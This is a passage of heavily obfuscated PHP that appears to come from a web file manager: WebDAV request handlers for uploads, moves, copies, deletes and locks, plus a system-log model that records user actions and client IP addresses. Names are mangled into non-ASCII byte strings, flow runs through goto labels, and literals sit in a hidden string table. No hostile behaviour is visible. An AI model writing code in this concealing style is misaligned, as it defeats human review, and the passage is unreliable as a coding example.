$_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$F¨≥•»û÷Ç) { return $F¨≥•»û÷Ç; } $B…ÂΩùÖÊﬁ = array($B£—ÇŒ¡°Ñ[73], $B£—ÇŒ¡°Ñ[74], $B£—ÇŒ¡°Ñ[1797]); goto c÷•øçòîô; E‹⁄™®®‹ﬂ: return $BÁÊÜÌÑüé; goto DúË°√€¨®; c÷•øçòîô: $BÁÊÜÌÑüé = array(); foreach ($F¨≥•»û÷Ç as $fÕ≠ííΩ÷≤ => $cº¬´®•Ëã) { if (!in_array($fÕ≠ííΩ÷≤, $B…ÂΩùÖÊﬁ) || !is_array($cº¬´®•Ëã)) { continue; } $BÁÊÜÌÑüé = array_merge($BÁÊÜÌÑüé, $cº¬´®•Ëã); } foreach ($BÁÊÜÌÑüé as &$FÜòúïòò) { $FÜòúïòò[$B£—ÇŒ¡°Ñ[28]] = str_replace($B£—ÇŒ¡°Ñ[8], $B£—ÇŒ¡°Ñ[1391], $FÜòúïòò[$B£—ÇŒ¡°Ñ[28]]); } goto E‹⁄™®®‹ﬂ; DúË°√€¨®: } public function httpPROPFIND() { goto DÖúìÓƒÏê; DÖúìÓƒÏê: $EÉ´∫Ø∞—ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bîﬁÈ¢ﬂŒà = $this->pathList($this->path); $Aó¨ôÇÊí„ = $this->pathListMerge($bîﬁÈ¢ﬂŒà); goto CÆôÑ⁄ßÃ∑; C±‚ùÖ◊åÑ: if ($B‰≤íëô£ﬂ) { $Aó¨ôÇÊí„ = array($dˆ£∫≥ßœñ); } else { $dˆ£∫≥ßœñ[$EÉ´∫Ø∞—ç[28]] = $EÉ´∫Ø∞—ç[33]; $Aó¨ôÇÊí„ = array_merge(array($dˆ£∫≥ßœñ), $Aó¨ôÇÊí„); } $b¶–í∆ˆÑÉ = $EÉ´∫Ø∞—ç[33]; foreach ($Aó¨ôÇÊí„ as $E§üï¬⁄ôœ) { $b¶–í∆ˆÑÉ .= $this->parseItemXml($E§üï¬⁄ôœ, $B‰≤íëô£ﬂ); } goto d≤Ü˜ÛãÃÂ; CÆôÑ⁄ßÃ∑: $dˆ£∫≥ßœñ = $bîﬁÈ¢ﬂŒà[$EÉ´∫Ø∞—ç[1798]]; if (!is_array($Aó¨ôÇÊí„) || $dˆ£∫≥ßœñ[$EÉ´∫Ø∞—ç[1799]] === !1) { return array($EÉ´∫Ø∞—ç[1800] => 404, $EÉ´∫Ø∞—ç[1801] => $EÉ´∫Ø∞—ç[1802]); } $B‰≤íëô£ﬂ = $dˆ£∫≥ßœñ[$EÉ´∫Ø∞—ç[29]] == $EÉ´∫Ø∞—ç[167] || HttpHeader::get($EÉ´∫Ø∞—ç[1777]) == $EÉ´∫Ø∞—ç[468]; goto C±‚ùÖ◊åÑ; d≤Ü˜ÛãÃÂ: return array($EÉ´∫Ø∞—ç[1800] => 207, $EÉ´∫Ø∞—ç[1801] => "\x3c\x44\72\x6d\165\x6c\164\x69\x73\x74\141\x74\x75\163\x20\170\x6d\154\x6e\163\72\x44\75\42\x44\101\x56\72\x22\x3e\xa{$b¶–í∆ˆÑÉ}\12\74\x2f\x44\72\x6d\165\154\164\x69\163\x74\141\x74\x75\x73\x3e"); goto b–Ñîú·Ëô; b–Ñîú·Ëô: } public function httpHEAD() { $BñÀˆ¿·≈≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EæÒÈ∑ª·ƒ = $this->pathInfo($this->path); if (!$EæÒÈ∑ª·ƒ || $EæÒÈ∑ª·ƒ[$BñÀˆ¿·≈≥[29]] == $BñÀˆ¿·≈≥[76]) { return array($BñÀˆ¿·≈≥[1036] => 200, $BñÀˆ¿·≈≥[1210] => array($BñÀˆ¿·≈≥[1803])); } return array($BñÀˆ¿·≈≥[1036] => 200, $BñÀˆ¿·≈≥[1210] => array($BñÀˆ¿·≈≥[1804], $BñÀˆ¿·≈≥[136], $BñÀˆ¿·≈≥[1805] . $EæÒÈ∑ª·ƒ[$BñÀˆ¿·≈≥[77]], $BñÀˆ¿·≈≥[1806] . get_file_mime($EæÒÈ∑ª·ƒ[$BñÀˆ¿·≈≥[160]]), $BñÀˆ¿·≈≥[132] . gmdate($BñÀˆ¿·≈≥[1792], $EæÒÈ∑ª·ƒ[$BñÀˆ¿·≈≥[1257]]) . $BñÀˆ¿·≈≥[1807], $BñÀˆ¿·≈≥[1808])); } public function httpOPTIONS() { $f——Œπ¥ÿŸ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($f——Œπ¥ÿŸ[1036] => 200, $f——Œπ¥ÿŸ[1210] => array($f——Œπ¥ÿŸ[1809], $f——Œπ¥ÿŸ[1810], $f——Œπ¥ÿŸ[1811], $f——Œπ¥ÿŸ[1266])); } public function httpPROPPATCH() { $fº„˘ﬂœÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a€ÖøÜ•‘· = $fº„˘ﬂœÖ[1812] . $_SERVER[$fº„˘ﬂœÖ[1389]] . $fº„˘ﬂœÖ[1813]; return array($fº„˘ﬂœÖ[1800] => 207, $fº„˘ﬂœÖ[1801] => "\74\x44\x3a\x6d\x75\154\164\x69\163\164\141\164\x75\163\40\170\x6d\x6c\x6e\163\72\x44\x3d\42\x44\101\126\72\42\x3e\12{$a€ÖøÜ•‘·}\xa\74\57\x44\x3a\x6d\165\154\x74\x69\x73\164\x61\164\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $aÓíòòƒê˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a˜À∑‡ﬁî„ = $this->uploadFile(); if ($a˜À∑‡ﬁî„) { $aù¿ú»∞Öƒ = 204; } else { $a˜À∑‡ﬁî„ = $aÓíòòƒê˜[33]; $aù¿ú»∞Öƒ = 201; } $bÓ˜√ëŒºï = $this->pathPut($this->path, $a˜À∑‡ﬁî„); if ($bÓ˜√ëŒºï == !1) { $aù¿ú»∞Öƒ = 404; } return array($aÓíòòƒê˜[1800] => $aù¿ú»∞Öƒ); } private function uploadFile() { goto EìËŸüÂ®®; F≥çœÉ∏◊ô: $dﬁÜçâçõÊ = @fopen($cÇ∆™Áıﬂ, $Aﬂó©∑ãﬂ˘[1523]); $eí¯≈ÇûÈì = @fopen($Aﬂó©∑ãﬂ˘[1815], $Aﬂó©∑ãﬂ˘[1522]); if (!$eí¯≈ÇûÈì || !$dﬁÜçâçõÊ) { @unlink($cÇ∆™Áıﬂ); return !1; } goto f¯Çêäêòã; EìËŸüÂ®®: $Aﬂó©∑ãﬂ˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; @mk_dir(TEMP_FILES); $cÇ∆™Áıﬂ = TEMP_FILES . $Aﬂó©∑ãﬂ˘[1814] . rand_string(32); goto F≥çœÉ∏◊ô; f¯Çêäêòã: while (!feof($eí¯≈ÇûÈì)) { fwrite($dﬁÜçâçõÊ, fread($eí¯≈ÇûÈì, 1024 * 200)); } fclose($eí¯≈ÇûÈì); fclose($dﬁÜçâçõÊ); goto Aç¡õãÂÓì; Aç¡õãÂÓì: if (@filesize($cÇ∆™Áıﬂ) > 0) { return $cÇ∆™Áıﬂ; } @unlink($cÇ∆™Áıﬂ); return !1; goto aÀ∆´ÀÀ¢; aÀ∆´ÀÀ¢: } public function httpMKCOL() { $aΩıÊàçÍ´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->pathExists($this->path)) { return array($aΩıÊàçÍ´[1036] => 409); } $f˘—÷ä¨àÛ = $this->pathMkdir($this->path); return array($aΩıÊàçÍ´[1036] => $f˘—÷ä¨àÛ ? 201 : 403); } public function httpMOVE() { $DºÖΩÉ¯‰º =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c≈ÏßàáóÇ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$DºÖΩÉ¯‰º[1816]])) { $d±ä√ÑÖìˆ[$DºÖΩÉ¯‰º[1817]] = $_SERVER[$DºÖΩÉ¯‰º[1816]] == $DºÖΩÉ¯‰º[1818]; } $D¢Ë§‰àÒÁ = $this->pathMove($this->path, $c≈ÏßàáóÇ); return array($DºÖΩÉ¯‰º[1036] => $D¢Ë§‰àÒÁ ? 201 : 404); } public function httpCOPY() { $CãèßÒ√≥≈ = $this->parsePath($this->pathGet(!0)); $EÉÜåÖ⁄∂Ô = $this->pathCopy($this->path, $CãèßÒ√≥≈); return array($_SERVER[Ä¿¡‡öóµŸﬂ‡][1036] => $EÉÜåÖ⁄∂Ô ? 201 : 404); } public function httpDELETE() { $aø’µé—Ò‰ = $this->pathRemove($this->path); return array($_SERVER[Ä¿¡‡öóµŸﬂ‡][1036] => $aø’µé—Ò‰ ? 200 : 503); } public function httpLOCK() { $Dá‘À˘±ı¿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eúîì‘••è = md5($this->path); $eà¡áƒÎ˜≠ = $Dá‘À˘±ı¿[1819] . $this->xmlGet($Dá‘À˘±ı¿[1820]) . $Dá‘À˘±ı¿[1821] . $eúîì‘••è . $Dá‘À˘±ı¿[1822]; return array($Dá‘À˘±ı¿[1036] => 200, $Dá‘À˘±ı¿[1210] => array($Dá‘À˘±ı¿[1823] . $eúîì‘••è, $Dá‘À˘±ı¿[1824]), $Dá‘À˘±ı¿[1825] => $eà¡áƒÎ˜≠); } public function httpUNLOCK() { return array($_SERVER[Ä¿¡‡öóµŸﬂ‡][1036] => 204); } public function xmlGet($D˘ÓÆèÖÜè) { goto bö’Êºô—ã; eÜ•©ÛãŒ€: $Cö¡ıºÂé∂ = array_shift(explode($céíÖúß≠ı[8], $D˘ÓÆèÖÜè)); $B»êÀëÂÕë = $cÿòµπòÊı->getElementsByTagNameNS($céíÖúß≠ı[1827], $Cö¡ıºÂé∂); if ($B»êÀëÂÕë) { return $B»êÀëÂÕë[0]->nodeValue; } goto dÃ“ê√ûÛú; dÃ“ê√ûÛú: return $céíÖúß≠ı[33]; goto AÇ˘Ùñı®∑; bö’Êºô—ã: $céíÖúß≠ı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $cÿòµπòÊı = false; if (!$cÿòµπòÊı) { $EêÏøâÂ≤ç = file_get_contents($céíÖúß≠ı[1826]); $cÿòµπòÊı = new DOMDocument(); $cÿòµπòÊı->loadXML($EêÏøâÂ≤ç); } goto eÜ•©ÛãŒ€; AÇ˘Ùñı®∑: } public static function response($AÏã¬„…õÚ) { goto b§ŒÑ¯ÍÈÀ; E•’êµÓÓÇ: $c¨∞õçõ‚Ê[] = $f¡ëã•õ¥ß[1767]; $c¨∞õçõ‚Ê[] = $f¡ëã•õ¥ß[1768]; foreach ($c¨∞õçõ‚Ê as $Aæ¡†çëõ€) { header($Aæ¡†çëõ€); } goto f¥Œ›·µ„ﬂ; b§ŒÑ¯ÍÈÀ: $f¡ëã•õ¥ß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c¨∞õçõ‚Ê = is_array($AÏã¬„…õÚ[$f¡ëã•õ¥ß[1210]]) ? $AÏã¬„…õÚ[$f¡ëã•õ¥ß[1210]] : array(); $c¨∞õçõ‚Ê[] = HttpHeader::code($AÏã¬„…õÚ[$f¡ëã•õ¥ß[1036]]); goto E•’êµÓÓÇ; f¥Œ›·µ„ﬂ: if (is_string($AÏã¬„…õÚ[$f¡ëã•õ¥ß[1825]])) { header($f¡ëã•õ¥ß[1828]); $CÖ∑®Ñè…ı = $f¡ëã•õ¥ß[1829] . $f¡ëã•õ¥ß[217] . $AÏã¬„…õÚ[$f¡ëã•õ¥ß[1825]]; echo $CÖ∑®Ñè…ı; } goto f„æÔƒ«¢è; f„æÔƒ«¢è: } } goto f∑¿éŒÓÉ⁄; c©à∞Çìô: define($_SERVER[Ä¿¡‡öóµŸﬂ‡][227], 2); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][228], 3); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][229], 1); goto A‘Û¢ì—§…; fáÔÈÃÚÈ±: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\124\x69\155\145", "\164\151\155\145", "\x69\156\x73\x65\x72\164", "\x66\165\156\143\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $b≤£àÇ•¶‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($b≤£àÇ•¶‘[2382] => LNG($b≤£àÇ•¶‘[2383]), $b≤£àÇ•¶‘[2384] => LNG($b≤£àÇ•¶‘[2385]), $b≤£àÇ•¶‘[2045] => LNG($b≤£àÇ•¶‘[2386]), $b≤£àÇ•¶‘[2387] => LNG($b≤£àÇ•¶‘[2388]), $b≤£àÇ•¶‘[2389] => LNG($b≤£àÇ•¶‘[2390]), $b≤£àÇ•¶‘[2391] => LNG($b≤£àÇ•¶‘[2392]), $b≤£àÇ•¶‘[2393] => LNG($b≤£àÇ•¶‘[2394]), $b≤£àÇ•¶‘[2395] => LNG($b≤£àÇ•¶‘[2396]), $b≤£àÇ•¶‘[2076] => LNG($b≤£àÇ•¶‘[2397]), $b≤£àÇ•¶‘[2077] => LNG($b≤£àÇ•¶‘[2398]), $b≤£àÇ•¶‘[2399] => LNG($b≤£àÇ•¶‘[2400]), $b≤£àÇ•¶‘[2401] => LNG($b≤£àÇ•¶‘[2402]), $b≤£àÇ•¶‘[2403] => LNG($b≤£àÇ•¶‘[2404]), $b≤£àÇ•¶‘[2405] => LNG($b≤£àÇ•¶‘[2406]), $b≤£àÇ•¶‘[2074] => LNG($b≤£àÇ•¶‘[2407]), $b≤£àÇ•¶‘[2081] => LNG($b≤£àÇ•¶‘[2408]), $b≤£àÇ•¶‘[2409] => LNG($b≤£àÇ•¶‘[2410]), $b≤£àÇ•¶‘[2411] => LNG($b≤£àÇ•¶‘[2412]), $b≤£àÇ•¶‘[2413] => LNG($b≤£àÇ•¶‘[2414]), $b≤£àÇ•¶‘[2415] => LNG($b≤£àÇ•¶‘[2416]), $b≤£àÇ•¶‘[2084] => LNG($b≤£àÇ•¶‘[2417]), $b≤£àÇ•¶‘[2085] => LNG($b≤£àÇ•¶‘[2418]), $b≤£àÇ•¶‘[2419] => LNG($b≤£àÇ•¶‘[2420]), $b≤£àÇ•¶‘[2421] => LNG($b≤£àÇ•¶‘[2422]), $b≤£àÇ•¶‘[2423] => LNG($b≤£àÇ•¶‘[2424]), $b≤£àÇ•¶‘[2079] => LNG($b≤£àÇ•¶‘[2425]), $b≤£àÇ•¶‘[2426] => LNG($b≤£àÇ•¶‘[2427]), $b≤£àÇ•¶‘[2078] => LNG($b≤£àÇ•¶‘[2428]), $b≤£àÇ•¶‘[2429] => LNG($b≤£àÇ•¶‘[2430]), $b≤£àÇ•¶‘[2431] => LNG($b≤£àÇ•¶‘[2432]), $b≤£àÇ•¶‘[2433] => LNG($b≤£àÇ•¶‘[2433]), $b≤£àÇ•¶‘[2434] => LNG($b≤£àÇ•¶‘[2049]), $b≤£àÇ•¶‘[2435] => LNG($b≤£àÇ•¶‘[2436]), $b≤£àÇ•¶‘[2437] => LNG($b≤£àÇ•¶‘[2438]), $b≤£àÇ•¶‘[2439] => LNG($b≤£àÇ•¶‘[2440]), $b≤£àÇ•¶‘[2441] => LNG($b≤£àÇ•¶‘[2442]), $b≤£àÇ•¶‘[2443] => LNG($b≤£àÇ•¶‘[2444]), $b≤£àÇ•¶‘[2445] => LNG($b≤£àÇ•¶‘[2445]), $b≤£àÇ•¶‘[2446] => LNG($b≤£àÇ•¶‘[2447]), $b≤£àÇ•¶‘[2448] => LNG($b≤£àÇ•¶‘[2449]), $b≤£àÇ•¶‘[2450] => LNG($b≤£àÇ•¶‘[2451]), $b≤£àÇ•¶‘[2452] => LNG($b≤£àÇ•¶‘[2453]), $b≤£àÇ•¶‘[2454] => LNG($b≤£àÇ•¶‘[2455]), $b≤£àÇ•¶‘[2456] => LNG($b≤£àÇ•¶‘[2457])); } private function typeFile() { $bêºƒ’º–∏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aÈó¿Œë·Ø = array($bêºƒ’º–∏[2081] => array($bêºƒ’º–∏[2082]), $bêºƒ’º–∏[2403] => array($bêºƒ’º–∏[2458]), $bêºƒ’º–∏[2405] => array($bêºƒ’º–∏[2459]), $bêºƒ’º–∏[2074] => array($bêºƒ’º–∏[2075]), $bêºƒ’º–∏[2411] => array(), $bêºƒ’º–∏[2413] => array(), $bêºƒ’º–∏[2415] => array(), $bêºƒ’º–∏[2084] => array($bêºƒ’º–∏[2086]), $bêºƒ’º–∏[2085] => array($bêºƒ’º–∏[2086]), $bêºƒ’º–∏[2419] => array($bêºƒ’º–∏[2460]), $bêºƒ’º–∏[2421] => array($bêºƒ’º–∏[2460]), $bêºƒ’º–∏[2423] => array($bêºƒ’º–∏[2461]), $bêºƒ’º–∏[2409] => array($bêºƒ’º–∏[2462]), $bêºƒ’º–∏[2079] => array($bêºƒ’º–∏[2463]), $bêºƒ’º–∏[2426] => array($bêºƒ’º–∏[2464]), $bêºƒ’º–∏[2078] => array($bêºƒ’º–∏[2080])); return $aÈó¿Œë·Ø; } private function typeAll() { goto fçºø˜ÑÁù; FîıËÉà™á: return $Dë „™ôüÚ; goto dÓπ∏Œµ˜á; fçºø˜ÑÁù: $dÛã™‚ÖòÇ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dë „™ôüÚ = $this->typeList; $A—í≈ÆÔäﬁ = array_filter($this->typeFile()); goto BÿŸ¿Ç›ä€; BÿŸ¿Ç›ä€: foreach ($A—í≈ÆÔäﬁ as $EÃÜ«”Ωà› => $bèü¨®Ê£∑) { $Dë „™ôüÚ[$bèü¨®Ê£∑[0]] = $Dë „™ôüÚ[$EÃÜ«”Ωà›]; } $Dë „™ôüÚ[$dÛã™‚ÖòÇ[2086]] = LNG($dÛã™‚ÖòÇ[2465]); $Dë „™ôüÚ[$dÛã™‚ÖòÇ[2460]] = LNG($dÛã™‚ÖòÇ[2466]); goto FîıËÉà™á; dÓπ∏Œµ˜á: } public function addLog($C√÷Í©—ì—, $EÛÏ´•÷Œ„ = array()) { goto a≈°ˆ‹À†é; a≈°ˆ‹À†é: $BÊ∑ã≈ëÉ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($this->typeList[$C√÷Í©—ì—])) { return; } $f∆Ω™ áÍ = USER_ID ? USER_ID : (isset($EÛÏ´•÷Œ„[$BÊ∑ã≈ëÉ[1438]]) ? $EÛÏ´•÷Œ„[$BÊ∑ã≈ëÉ[1438]] : 0); goto AŸ¿ÂÉ°Ù⁄; bçΩûÙÒ…ÿ: parent::add($EÛÏ´•÷Œ„); goto F˜ÕÉå€î‰; AŸ¿ÂÉ°Ù⁄: $FÂÛ∆¯ÚÈÆ = get_client_ip(); if (!$EÛÏ´•÷Œ„ || strlen(json_encode($EÛÏ´•÷Œ„)) >= 1024) { $EÛÏ´•÷Œ„ = array($BÊ∑ã≈ëÉ[2467] => $FÂÛ∆¯ÚÈÆ); } else { if (is_array($EÛÏ´•÷Œ„)) { $EÛÏ´•÷Œ„[$BÊ∑ã≈ëÉ[2467]] = $FÂÛ∆¯ÚÈÆ; } else { $EÛÏ´•÷Œ„ = array($BÊ∑ã≈ëÉ[1038] => $EÛÏ´•÷Œ„, $BÊ∑ã≈ëÉ[2467] => $FÂÛ∆¯ÚÈÆ); } } $EÛÏ´•÷Œ„ = array($BÊ∑ã≈ëÉ[1428] => Session::sign(), $BÊ∑ã≈ëÉ[1429] => $f∆Ω™ áÍ, $BÊ∑ã≈ëÉ[29] => $C√÷Í©—ì—, $BÊ∑ã≈ëÉ[1431] => json_encode($EÛÏ´•÷Œ„)); goto bçΩûÙÒ…ÿ; F˜ÕÉå€î‰: } public function remove($E‡À∆¬≈‘‰) { $this->where(array($_SERVER[Ä¿¡‡öóµŸﬂ‡][385] => $E‡À∆¬≈‘‰))->delete(); } private function _makeOrder($B‰ˆ ∏àÊ™ = '') { goto DËﬁÍÌ‚—ü; DËﬁÍÌ‚—ü: $D≤äÿ‚ò≤Á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bçôÿƒ≥∆– = $D≤äÿ‚ò≤Á[187]; $Fä†◊”ƒªÏ = array($D≤äÿ‚ò≤Á[402] => $D≤äÿ‚ò≤Á[403], $D≤äÿ‚ò≤Á[404] => $D≤äÿ‚ò≤Á[405]); goto aíµ©£ÆÙû; aˆ¡˜—Á·∏: return $this->order($B‰ˆ ∏àÊ™); goto Bø…◊Ê‰»¥; aíµ©£ÆÙû: $f≠∂¿⁄öéì = Input::get($D≤äÿ‚ò≤Á[408], $D≤äÿ‚ò≤Á[7], $D≤äÿ‚ò≤Á[2245], array($D≤äÿ‚ò≤Á[2182], $D≤äÿ‚ò≤Á[404])); $f≠∂¿⁄öéì = $Fä†◊”ƒªÏ[$f≠∂¿⁄öéì]; $B‰ˆ ∏àÊ™ = $B‰ˆ ∏àÊ™ . "{$bçôÿƒ≥∆–}\40{$f≠∂¿⁄öéì}"; goto aˆ¡˜—Á·∏; Bø…◊Ê‰»¥: } public function get($a‰–¡’èµ¬ = '') { goto Aä£›€ûîå; fÒ∂£õßÌâ: $b˜ã“‚ØóÀ[$EêœÇÖ»ãå[354]] = $this->logList($b˜ã“‚ØóÀ[$EêœÇÖ»ãå[354]]); return $b˜ã“‚ØóÀ; goto eÎÉ€Ìñÿù; B’Î◊àöÜ‘: if (!empty($a‰–¡’èµ¬[$EêœÇÖ»ãå[2467]])) { $fÈèôüÿÁÍ[$EêœÇÖ»ãå[405]] = array($EêœÇÖ»ãå[760], "\45{$a‰–¡’èµ¬[$EêœÇÖ»ãå[2467]]}\x25"); } $b˜ã“‚ØóÀ = $this->_makeOrder()->where($fÈèôüÿÁÍ)->selectPage(); if (empty($b˜ã“‚ØóÀ[$EêœÇÖ»ãå[354]])) { show_json(array(), !0, $b˜ã“‚ØóÀ[$EêœÇÖ»ãå[351]]); } goto fÒ∂£õßÌâ; Aä£›€ûîå: $EêœÇÖ»ãå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$a‰–¡’èµ¬) { show_json(array()); } $fÈèôüÿÁÍ = array(); goto B„Ùï˜ÓÉ ; B„Ùï˜ÓÉ : if ($a‰–¡’èµ¬[$EêœÇÖ»ãå[1438]]) { $fÈèôüÿÁÍ[$EêœÇÖ»ãå[1438]] = $a‰–¡’èµ¬[$EêœÇÖ»ãå[1438]]; } if (isset($a‰–¡’èµ¬[$EêœÇÖ»ãå[702]])) { $BÑ÷Éø¿™ø = $a‰–¡’èµ¬[$EêœÇÖ»ãå[702]]; $E”Ë°æﬁÆÑ = isset($a‰–¡’èµ¬[$EêœÇÖ»ãå[703]]) ? $a‰–¡’èµ¬[$EêœÇÖ»ãå[703]] : time(); $fÈèôüÿÁÍ[$EêœÇÖ»ãå[187]] = array($EêœÇÖ»ãå[321], array($BÑ÷Éø¿™ø, $E”Ë°æﬁÆÑ)); } if ($a‰–¡’èµ¬[$EêœÇÖ»ãå[29]]) { $EöêÜ’æñ≠ = explode($EêœÇÖ»ãå[47], $a‰–¡’èµ¬[$EêœÇÖ»ãå[29]]); $dîõ∞ÓÛÆÌ = $this->typeFile(); $fçÊãÉê◊“ = array(); foreach ($EöêÜ’æñ≠ as $B∂è∏¢†øƒ) { $fçÊãÉê◊“[] = $B∂è∏¢†øƒ; if (isset($dîõ∞ÓÛÆÌ[$B∂è∏¢†øƒ])) { $fçÊãÉê◊“ = array_merge($fçÊãÉê◊“, $dîõ∞ÓÛÆÌ[$B∂è∏¢†øƒ]); } } $fçÊãÉê◊“ = array_unique($fçÊãÉê◊“); if ($fçÊãÉê◊“) { $fÈèôüÿÁÍ[$EêœÇÖ»ãå[29]] = array($EêœÇÖ»ãå[7], $fçÊãÉê◊“); } } goto B’Î◊àöÜ‘; eÎÉ€Ìñÿù: } private function ipAddress(&$C‡ç±œ˜¯¡) { $B•äÇäΩ…í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!empty($C‡ç±œ˜¯¡[$B•äÇäΩ…í[2467]])) { $FÚﬁí—∑Ó· = IpLocation::get($C‡ç±œ˜¯¡[$B•äÇäΩ…í[2467]]); } else { $FÚﬁí—∑Ó· = LNG($B•äÇäΩ…í[2468]); } $C‡ç±œ˜¯¡[$B•äÇäΩ…í[2469]] = $FÚﬁí—∑Ó·; } private function descZipDownload($dâêÊÍãÒ¶, &$eêÏÑÇºì¥) { $dµÁ≠¯Ç¶∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($dâêÊÍãÒ¶[$dµÁ≠¯Ç¶∆[2470]])) { return; } $CÂ–†ÌÈ“Û = json_decode($dâêÊÍãÒ¶[$dµÁ≠¯Ç¶∆[2470]], !0); foreach ($CÂ–†ÌÈ“Û as $FÖÔ·áàñå) { if (!IO::init($FÖÔ·áàñå[$dµÁ≠¯Ç¶∆[75]])) { continue; } if (!($b±œËöº–Ã = IO::infoFull($FÖÔ·áàñå[$dµÁ≠¯Ç¶∆[75]]))) { continue; } $dâêÊÍãÒ¶[$dµÁ≠¯Ç¶∆[75]] = $FÖÔ·áàñå[$dµÁ≠¯Ç¶∆[75]]; $eêÏÑÇºì¥[] = $dâêÊÍãÒ¶[$dµÁ≠¯Ç¶∆[369]] = $b±œËöº–Ã[$dµÁ≠¯Ç¶∆[369]]; $eêÏÑÇºì¥[] = $dâêÊÍãÒ¶[$dµÁ≠¯Ç¶∆[2288]] = $b±œËöº–Ã[$dµÁ≠¯Ç¶∆[461]]; break; } return $dâêÊÍãÒ¶; } private function getSourceList(&$eûÂ…ç∂Óî) { $A◊™¬Ø£Ñó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F∂ìÒ⁄¿Ω© = array(); foreach ($eûÂ…ç∂Óî as $f†ﬂê¯ÏÓº => $CÛ÷ú¢ﬁÎÊ) { goto d‡Â—ÏÀÑ‹; cå‘ ∂Ü§Ω: $F∂ìÒ⁄¿Ω©[] = $F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[369]]; $F∂ìÒ⁄¿Ω©[] = $F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[2288]]; if ($F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[29]] == $A◊™¬Ø£Ñó[492]) { $F∂ìÒ⁄¿Ω©[] = $F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[405]][$A◊™¬Ø£Ñó[1011]]; $F∂ìÒ⁄¿Ω©[] = $F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[405]][$A◊™¬Ø£Ñó[1012]]; } goto e·ô–êºí ; d‡Â—ÏÀÑ‹: $F®ÏÛ‘ó•« = json_decode($CÛ÷ú¢ﬁÎÊ[$A◊™¬Ø£Ñó[405]], !0); if ($CÛ÷ú¢ﬁÎÊ[$A◊™¬Ø£Ñó[29]] == $A◊™¬Ø£Ñó[2077]) { $F®ÏÛ‘ó•« = $this->descZipDownload($F®ÏÛ‘ó•«, $F∂ìÒ⁄¿Ω©); $eûÂ…ç∂Óî[$f†ﬂê¯ÏÓº][$A◊™¬Ø£Ñó[405]] = json_encode($F®ÏÛ‘ó•«); continue; } if (strpos($CÛ÷ú¢ﬁÎÊ[$A◊™¬Ø£Ñó[29]], $A◊™¬Ø£Ñó[2289]) !== 0) { goto AÊ©ìßÖâˆ; cØıúå∫πì: continue; goto cÁò¢ú∑€ﬂ; AÊ©ìßÖâˆ: if (!isset($F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[75]]) || strpos($CÛ÷ú¢ﬁÎÊ[$A◊™¬Ø£Ñó[29]], $A◊™¬Ø£Ñó[2471]) !== 0) { continue; } if (!IO::init($F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[75]])) { continue; } if (!($fΩ¯ôŸ»„£ = IO::infoFull($F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[75]]))) { continue; } goto FñÓè∫·ê£; FñÓè∫·ê£: $F∂ìÒ⁄¿Ω©[] = $F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[369]] = $fΩ¯ôŸ»„£[$A◊™¬Ø£Ñó[369]]; $F∂ìÒ⁄¿Ω©[] = $F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[2288]] = $fΩ¯ôŸ»„£[$A◊™¬Ø£Ñó[461]]; $eûÂ…ç∂Óî[$f†ﬂê¯ÏÓº][$A◊™¬Ø£Ñó[405]] = json_encode($F®ÏÛ‘ó•«); goto cØıúå∫πì; cÁò¢ú∑€ﬂ: } goto cå‘ ∂Ü§Ω; e·ô–êºí : if ($F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[29]] == $A◊™¬Ø£Ñó[2296]) { $F∂ìÒ⁄¿Ω©[] = $F®ÏÛ‘ó•«[$A◊™¬Ø£Ñó[405]][$A◊™¬Ø£Ñó[369]]; } goto FèÛ©¨ŸÃ”; FèÛ©¨ŸÃ”: } if (!$F∂ìÒ⁄¿Ω©) { return array(); } return Model($A◊™¬Ø£Ñó[761])->sourceListInfo($F∂ìÒ⁄¿Ω©, !0); } private function logList($E¨¶œ‘¯¥´) { goto DÑÃŸπüó¢; e‡µ≠’ıÕ—: return $b∑ƒ’◊Øìä; goto d—ﬁúÍ∆Ïæ; DÑÃŸπüó¢: $A©øé¨ãå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F“É–Ωâ–ä = array_to_keyvalue($E¨¶œ‘¯¥´, $A©øé¨ãå[33], $A©øé¨ãå[1438]); $E¬∫Ëñ°‘” = 